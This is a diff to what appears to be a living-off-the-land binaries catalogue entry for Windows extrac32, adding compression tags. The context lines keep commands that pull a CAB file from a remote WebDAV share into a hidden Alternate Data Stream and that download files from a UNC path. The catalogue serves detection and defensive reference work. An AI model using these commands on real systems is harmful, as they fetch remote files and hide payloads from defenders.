@@ -11,6 +11,7 @@ Commands:
     Privileges: User
     MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags: [Compress]
   - Command: extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe
     Description: Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file.
     Usecase: Extract data from cab file and hide it in an alternate data stream.
@@ -18,6 +19,7 @@ Commands:
     Privileges: User
     MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags: [Compress]
   - Command: extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
     Description: Copy the source file to the destination file and overwrite it.
     Usecase: Download file from UNC/WEBDav
